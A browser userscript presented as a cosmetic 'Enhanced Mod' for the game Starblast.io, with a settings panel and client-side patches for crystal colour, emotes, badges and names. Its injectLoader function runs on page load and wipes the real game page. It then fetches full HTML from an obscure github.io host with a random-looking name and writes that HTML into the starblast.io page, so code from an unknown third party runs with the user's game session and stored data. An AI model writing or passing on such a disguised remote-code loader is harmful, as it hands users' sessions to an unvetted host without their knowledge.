// ==UserScript==
// @name         Starblast.io Enhanced Mod
// @namespace    starblast-enhanced-mod
// @version      1.0
// @description  Enhanced Starblast.io mod with UI controls
// @author       You
// @match        https://starblast.io/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    const log = (msg) => console.log(`%c[eot] ${msg}`, "color: #FF00E6");
    
    // Settings object to store user preferences
    const settings = {
        crystalColor: localStorage.getItem('crystal-color') || '#ffffff',
        emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,
        showBlankBadge: localStorage.getItem('show-blank-badge') === 'true',
        uiVisible: localStorage.getItem('ui-visible') !== 'false'
    };

    // Save settings to localStorage
    function saveSettings() {
        localStorage.setItem('crystal-color', settings.crystalColor);
        localStorage.setItem('emote-capacity', settings.emoteCapacity.toString());
        localStorage.setItem('show-blank-badge', settings.showBlankBadge.toString());
        localStorage.setItem('ui-visible', settings.uiVisible.toString());
    }

    // Create UI Panel
    function createUI() {
        const panel = document.createElement('div');
        panel.id = 'starblast-mod-panel';
        panel.style.cssText = `
            position: fixed;
            top: 10px;
            left: 10px;
            width: 300px;
            background: rgba(20, 20, 20, 0.95);
            border: 2px solid #06c26d;
            border-radius: 10px;
            padding: 15px;
            font-family: Arial, sans-serif;
            font-size: 12px;
            color: #ffffff;
            z-index: 10000;
            box-shadow: 0 0 20px rgba(6, 194, 109, 0.3);
            backdrop-filter: blur(5px);
            display: ${settings.uiVisible ? 'block' : 'none'};
        `;

        panel.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                <h3 style="margin: 0; color: #06c26d;">Starblast Enhanced</h3>
                <button id="minimize-btn" style="background: #06c26d; border: none; color: white; padding: 5px 10px; border-radius: 5px; cursor: pointer;">−</button>
            </div>
            
            <div id="panel-content">
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px;">Crystal Color:</label>
                    <input type="color" id="crystal-color" value="${settings.crystalColor}" style="width: 100%; height: 35px; border: none; border-radius: 5px; cursor: pointer;">
                </div>
                
                <div style="margin-bottom: 15px;">
                    <label style="display: block; margin-bottom: 5px;">Emote Capacity: <span id="emote-value">${settings.emoteCapacity}</span></label>
                    <input type="range" id="emote-capacity" min="1" max="10" value="${settings.emoteCapacity}" 
                           style="width: 100%; background: #333; outline: none; cursor: pointer;">
                </div>
                
                <div style="margin-bottom: 15px;">
                    <label style="display: flex; align-items: center; cursor: pointer;">
                        <input type="checkbox" id="show-blank-badge" ${settings.showBlankBadge ? 'checked' : ''} 
                               style="margin-right: 10px; transform: scale(1.2);">
                        Show Blank Badges
                    </label>
                </div>
                
                <div style="text-align: center; margin-top: 15px; padding-top: 15px; border-top: 1px solid #333;">
                    <small style="color: #888;">Lowercase names enabled by default</small>
                </div>
            </div>
        `;

        document.body.appendChild(panel);

        // Add event listeners
        document.getElementById('minimize-btn').addEventListener('click', () => {
            const content = document.getElementById('panel-content');
            const btn = document.getElementById('minimize-btn');
            if (content.style.display === 'none') {
                content.style.display = 'block';
                btn.textContent = '−';
                settings.uiVisible = true;
            } else {
                content.style.display = 'none';
                btn.textContent = '+';
                settings.uiVisible = false;
            }
            saveSettings();
        });

        document.getElementById('crystal-color').addEventListener('change', (e) => {
            settings.crystalColor = e.target.value;
            saveSettings();
            log(`Crystal color changed to ${settings.crystalColor}`);
        });

        document.getElementById('emote-capacity').addEventListener('input', (e) => {
            settings.emoteCapacity = parseInt(e.target.value);
            document.getElementById('emote-value').textContent = settings.emoteCapacity;
            saveSettings();
            log(`Emote capacity changed to ${settings.emoteCapacity}`);
        });

        document.getElementById('show-blank-badge').addEventListener('change', (e) => {
            settings.showBlankBadge = e.target.checked;
            saveSettings();
            log(`Show blank badges: ${settings.showBlankBadge}`);
        });

        // Make panel draggable
        let isDragging = false;
        let dragOffset = { x: 0, y: 0 };

        panel.addEventListener('mousedown', (e) => {
            if (e.target.id === 'minimize-btn' || e.target.type === 'color' || e.target.type === 'range' || e.target.type === 'checkbox') return;
            isDragging = true;
            dragOffset.x = e.clientX - panel.offsetLeft;
            dragOffset.y = e.clientY - panel.offsetTop;
            panel.style.cursor = 'grabbing';
        });

        document.addEventListener('mousemove', (e) => {
            if (!isDragging) return;
            panel.style.left = (e.clientX - dragOffset.x) + 'px';
            panel.style.top = (e.clientY - dragOffset.y) + 'px';
        });

        document.addEventListener('mouseup', () => {
            isDragging = false;
            panel.style.cursor = 'default';
        });
    }

    // Code injection functions
    function injectCrystalColorChanger(src) {
        const crystalCode = `
            let CrystalObject;
            for (let i in window) try {
                let val = window[i];
                if ("function" == typeof val.prototype.createModel && val.prototype.createModel.toString().includes("Crystal")) {
                    CrystalObject = val;
                    break;
                }
            } catch (e) {}

            if (CrystalObject) {
                let oldModel = CrystalObject.prototype.getModelInstance;
                CrystalObject.prototype.getModelInstance = function () {
                    let res = oldModel.apply(this, arguments);
                    let color = localStorage.getItem("crystal-color") || "#ffffff";
                    if (color && this.material && this.material.color) {
                        this.material.color.set(color);
                    }
                    return res;
                };
            }
        `;
        return src + crystalCode;
    }

    function injectEmoteCapacityChanger(src) {
        const emoteCode = `
            setTimeout(() => {
                if (window.ChatPanel) {
                    let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/);
                    if (globalVal) {
                        globalVal = globalVal[0];
                        ChatPanel.prototype.getEmotesCapacity = function () {
                            let num = parseInt(localStorage.getItem("emote-capacity")) || 4;
                            try { 
                                return Math.trunc(Math.min(Math.max(1, num), 10)) || 4;
                            } catch (e) { 
                                return 4;
                            }
                        };
                        ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
                    }
                }
            }, 1000);
        `;
        return src + emoteCode;
    }

    function injectBlankBadgeToggle(src) {
        const badgeCode = `
            setTimeout(() => {
                let pattern = /,(\\s*"blank"\\s*!={1,2}\\s*this\\.custom\\.badge)/;
                let found = false;
                
                for (let i in window) try {
                    let val = window[i].prototype;
                    for (let j in val) {
                        let func = val[j];
                        if ("function" == typeof func && func.toString().match(pattern)) {
                            val[j] = Function("return " + func.toString().replace(pattern, ", (localStorage.getItem('show-blank-badge') === 'true') || $1"))();
                            found = true;
                            if (val.drawIcon) {
                                val.drawIcon = Function("return " + val.drawIcon.toString().replace(/}\\s*else\\s*{/, '} else if (this.icon !== "blank") {'))();
                            }
                            let gl = window[i];
                            for (let k in gl) {
                                if ("function" == typeof gl[k] && gl[k].toString().includes(".table")) {
                                    let oldF = gl[k];
                                    gl[k] = function () {
                                        let current = localStorage.getItem('show-blank-badge') === 'true';
                                        if (this.showBlank !== current) {
                                            for (let i in this.table) if (i.startsWith("blank")) delete this.table[i];
                                            this.showBlank = current;
                                        }
                                        return oldF.apply(this, arguments);
                                    };
                                    break;
                                }
                            }
                        }
                    }
                } catch (e) {}
            }, 1500);
        `;
        return src + badgeCode;
    }

    function injectLowercaseNames(src) {
        const lowercaseCode = `
            let g = setInterval(function () {
                try {
                    let playerInput = document.querySelector(".player-app, #player input");
                    if (playerInput) {
                        playerInput.style.textTransform = "none";
                        clearInterval(g);
                    }
                } catch (e) {}
            }, 100);

            setTimeout(() => {
                try {
                    let x = Object.values(Object.values(module.exports.settings).find(v => v && v.mode)).find(v => v && "function" == typeof v.startModdingMode);
                    if (x && x.startGame) {
                        x.startGame = Function("return " + x.startGame.toString().replace(/\\.toUpperCase\\(\\)/g, ""))();
                    }
                } catch (e) {}
            }, 2000);
        `;
        return src + lowercaseCode;
    }

    function injectCorrectNames(src) {
        const namesCode = `
            setTimeout(() => {
                try {
                    if (window.Names && Names.prototype.set) {
                        let oldNameSet = Names.prototype.set.toString();
                        let customVal = oldNameSet.match(/=\\s*(\\w+)\\.custom/);
                        if (customVal) {
                            customVal = customVal[1];
                            let a = oldNameSet.match(/\\w+\\s*={2,3}\\s*this\\.(\\w+)\\.[^&]+/);
                            if (a) {
                                let globalVal = a[1];
                                let condition = a[0];
                                Names.prototype.set = Function("return " + oldNameSet.replace(/return\\s+[^]+?\\)/, "return " + condition + " ? (this." + globalVal + ".player_name = " + customVal + ".player_name, Object.values(this." + globalVal + ").find(function(a) { return a && a.additional_badges }).custom = " + customVal + ".custom || {})"))();
                            }
                        }
                    }
                } catch (e) {}
            }, 2500);
        `;
        return src + namesCode;
    }

    // Main injection function
    function codeInjector(src) {
        log("Injecting enhanced features...");
        
        src = injectCrystalColorChanger(src);
        src = injectEmoteCapacityChanger(src);
        src = injectBlankBadgeToggle(src);
        src = injectLowercaseNames(src);
        src = injectCorrectNames(src);
        
        log("All features injected successfully");
        return src;
    }

    // Initialize the mod system
    function initializeMod() {
        // Initialize the code injectors array if it doesn't exist
        if (!window.sbCodeInjectors) {
            window.sbCodeInjectors = [];
        }
        
        // Add our code injector
        window.sbCodeInjectors.push(codeInjector);
        
        // Create UI when document is ready
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', createUI);
        } else {
            createUI();
        }
        
        log("Enhanced mod initialized");
    }

    // Text shadow color change function
    function changeTextShadowColor() {
        // This function can be customized to modify text shadows in the game
        log("Applying text shadow modifications...");
        // Add your text shadow modification logic here if needed
    }

    // Main code injection logic
    function injectLoader() {
        if (window.location.pathname !== "/") {
            log("Injection not needed");
            return;
        }

        document.open();
        document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
        document.close();

        var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sısm1sösm2k1.html';
        url += '?_=' + new Date().getTime();

        var xhr = new XMLHttpRequest();
        log("Fetching custom source...");
        xhr.open("GET", url);
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4 && xhr.status === 200) {
                var starSRC = xhr.responseText;

                if (starSRC !== undefined) {
                    log("Source fetched successfully");
                    const start_time = performance.now();
                    log("Applying mods...");

                    if (!window.sbCodeInjectors) {
                        log("No Starblast.io userscripts found to load");
                    } else {
                        let error_notified = false;
                        for (const injector of window.sbCodeInjectors) {
                            try {
                                if (typeof injector === "function") starSRC = injector(starSRC);
                                else {
                                    log("Injector was not a function");
                                    console.log(injector);
                                }
                            } catch (error) {
                                if (!error_notified) {
                                    alert("One of your Starblast.io userscripts failed to load");
                                    error_notified = true;
                                }
                                console.error(error);
                            }
                        }
                    }

                    const end_time = performance.now();
                    log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);

                    // After modifying the starSRC, apply text shadow modification
                    changeTextShadowColor();

                    // Apply the modified source to the document
                    document.open();
                    document.write(starSRC);
                    document.close();
                } else {
                    log("Source fetch failed");
                    alert("An error occurred while fetching game code");
                }
            }
        };

        xhr.send();
    }

    // Start the mod
    initializeMod();
    setTimeout(injectLoader, 1);

})();
